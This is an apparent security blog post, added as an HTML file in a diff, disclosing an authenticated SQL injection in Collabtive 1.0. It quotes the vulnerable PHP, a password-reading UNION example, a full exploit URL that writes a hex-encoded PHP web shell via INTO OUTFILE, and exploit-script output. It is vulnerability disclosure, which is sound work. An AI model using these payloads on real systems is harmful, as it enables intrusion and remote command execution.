@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<style type=text/css>body{font-family:monospace;}</style>
+	<title>Collabtive 1.0 - SQLi</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+	
+</head>
+<body>
+	<header>
+
+	<div style="float: right;"></div><br>
+	<p>
+	<nav>
+			<a href="/"><b>post</b></a>.
+			
+			
+			<a href="/other/"><b>other</b></a>.
+			
+			<a href="/about/"><b>about</b></a>.
+			
+	</nav>
+	</p>
+	
+</header>
+
+	
+	<main>
+		<article>
+			<h1>Collabtive 1.0 - SQLi</h1>
+			<b><time>2013-06-21</time></b>
+		       
+
+			<div>
+				<p><a href="http://collabtive.o-dyn.de/">Collabtive</a> is a web-based collaboration tool for project management, developed in PHP.  The latest version, Collabtive 1.0, is vulnerable to remote authenticated SQL injection.  Sourceforge page can be found <a href="http://sourceforge.net/projects/collabtive/?source=directory">here</a>, which appears to be clocking in just over 1000 downloads a week.  This issue was reported privately to the developers, and fixed in their Github <a href="https://github.com/philippK-de/Collabtive">repository</a>.</p>
+<p>User profiles are viewed/managed by manageuser.php, and upon loading a profile, runs the following:</p>
+<pre tabindex="0"><code> if (!empty($start) and !empty($end)) {
+        $track = $tracker-&gt;getUserTrack($id, $fproject, $taski, $start, $end);
+    } elseif (is_array($fproject)) {
+        foreach ($fproject as $fpro) {
+            $ptrack = $tracker-&gt;getUserTrack($id, $fpro, $taski, $start, $end);
+            if (!empty($ptrack)) {
+                foreach ($ptrack as $mytrack) {
+                    array_push($track, $mytrack);
+                }
+            }
+        }
+    } 
+</code></pre><p>Of interest is the <code>getUserTrack</code> function, as follows:</p>
+<pre tabindex="0"><code>function getUserTrack($user, $project = 0, $task = 0, $start = 0, $end = 0 , $lim = 50)
+    {
+        global $conn;
+        $user = (int) $user;
+        $project = (int) $project;
+        $lim = (int) $lim;
+
+        if ($project &gt; 0) {
+            $sql = &#34;SELECT * FROM timetracker WHERE user = $user AND project = $project&#34;;
+            $num = &#34;SELECT COUNT(*) FROM timetracker WHERE project = $project AND user = $user&#34;;
+            $order = &#34; ORDER BY ended ASC&#34;;
+        } else {
+            $sql = &#34;SELECT * FROM timetracker WHERE user = $user&#34;;
+            $num = &#34;SELECT COUNT(*) FROM timetracker WHERE user = $user&#34;;
+            $order = &#34; ORDER BY ended ASC&#34;;
+        }
+
+        if ($task &gt; 0) {
+            $sql .= &#34; AND task = $task&#34;;
+            $num .= &#34; AND task = $task&#34;;
+        }
+
+        if ($start &gt; 0 and $end &gt; 0) {
+            $start = strtotime($start);
+            $end = strtotime($end . &#34; +1 day&#34;);
+            $end = $end - 1;
+            $sql .= &#34; AND ended &gt;=$start AND ended&lt;=$end &#34;;
+            $num .= &#34; AND ended &gt;=$start AND ended&lt;=$end &#34;;
+        }
+
+        if ($num) {
+            $num = $conn-&gt;query($num)-&gt;fetch();
+            $num = $num[0];
+        } else {
+            $num = 0;
+        }
+</code></pre><p>The start/end/task variables are not cast to integers, and are not sanitized.  Sanitization wouldn&rsquo;t do much here, anyways, as the variables are appended without quotations, so we need only space queries out from input.  For example, <code>task=1 UNION SELECT passwords FROM user</code>.  Thus we highlight the importance of parameterized queries.  Just use them.</p>
+<p>This can be exploited with a simple UNION query to drop a shell:</p>
+<pre tabindex="0"><code>http://192.168.1.219/collabtive/manageuser.php?action=profile&amp;id=1&amp;task=1%20UNION%20SELECT%200x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e%20INTO%20OUTFILE%20%27hcked%27;&amp;project=1
+</code></pre><p>Exploiting:</p>
+<pre tabindex="0"><code>root@jali:~/exploits# python collabtive_10_sqli.py -i 192.168.1.83 -P vlh4soc9k2t5vnp6s5d8glga17
+[!] Dropping web shell on 192.168.1.83...
+[!] Shell dropped.  http://192.168.1.83/collabtive/gkre4.php?rr=ls
+</code></pre><figure class="center"><img src="http://1.bp.blogspot.com/-eVNRT30tTOU/Ub8_vbq_ZiI/AAAAAAAAAgM/ZssKBHVVMNs/s640/collabtive_10_sploit.jpg"/>
+</figure>
+
+<p><a href="http://www.exploit-db.com/exploits/26410/">Exploit</a></p>
+
+			</div>
+		</article>
+	</main>
+<aside>
+	<div>
+		<div>
+			<h3>LATEST POSTS</h3>
+		</div>
+		<div>
+			<ul>
+				
+				<li><a href="/blog/the-fanciful-allure-and-utility-of-syscalls/">the fanciful allure and utility of syscalls</a></li>
+				
+				<li><a href="/blog/on-exploiting-cve-2021-1648-splwow64-lpe/">On Exploiting CVE-2021-1648 (splwow64 LPE)</a></li>
+				
+				<li><a href="/blog/digging-the-adobe-sandbox-ipc-internals/">Digging the Adobe Sandbox - IPC Internals</a></li>
+				
+				<li><a href="/blog/exploiting-leaked-process-and-thread-handles/">Exploiting Leaked Process and Thread Handles</a></li>
+				
+				<li><a href="/blog/code-execution-via-fiber-local-storage/">Code Execution via Fiber Local Storage</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</aside>
+
+
+	<footer>
+	<p>&copy; 2024 <a href="https://dronesec.pw/"><b>Bryan Alexander</b></a>.
+	</p>
+</footer>
+
+</body>
+</html>
